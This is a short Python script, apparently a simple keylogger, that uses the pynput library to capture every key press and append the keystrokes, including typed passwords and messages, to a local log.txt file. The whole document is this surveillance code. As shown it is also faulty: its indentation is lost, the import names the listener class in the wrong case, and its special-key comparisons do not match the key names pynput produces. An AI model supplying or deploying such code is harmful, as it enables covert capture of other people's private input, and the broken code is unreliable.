# install pynput package
from pynput.keyboard import listener

def write_to_file(key) : 
letter = str(key)
letter = letter.replace("'","")

if letter == 'key.space':
letter = ' '
if letter == 'key.shift_l':
letter = ''
if letter == 'key.ctrl_r':
letter = ''
if letter == 'key.enter':
letter = '\n'

with open('log.txt','a') as f:
f.write(letter)

with listener(on_press=write_to_file) as l : 
l.join()
